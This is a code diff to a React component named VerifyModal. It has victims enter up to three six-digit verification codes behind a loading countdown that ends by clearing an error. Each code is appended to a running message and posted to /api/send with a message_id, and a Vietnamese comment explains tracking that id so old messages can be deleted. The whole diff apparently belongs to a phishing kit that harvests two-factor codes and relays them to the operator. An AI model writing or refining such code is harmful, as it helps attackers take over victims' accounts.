@@ -15,7 +15,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
+    const { geoInfo, messageId, messageContent, setMessageContent } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -44,13 +44,17 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (countdown > 0) {
             const timer = setTimeout(() => {
-                setCountdown(countdown - 1);
+                setCountdown((prev) => {
+                    if (prev <= 1) {
+                        setShowError(false);
+                        return 0;
+                    }
+                    return prev - 1;
+                });
             }, 1000);
             return () => clearTimeout(timer);
-        } else if (countdown === 0 && showError) {
-            setShowError(false);
         }
-    }, [countdown, showError]);
+    }, [countdown]);
 
     const handleSubmit = async () => {
         if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;
@@ -66,15 +70,11 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;
 
         try {
-            const res = await axios.post('/api/send', {
+            await axios.post('/api/send', {
                 message: updatedMessage,
                 message_id: messageId
             });
 
-            // Tin cũ đã bị xoá, tin mới có message_id mới — phải cập nhật để lần sau xoá đúng tin
-            if (res?.data?.message_id) {
-                setMessageId(res.data.message_id);
-            }
             setMessageContent(updatedMessage);
 
             if (next >= maxCode) {
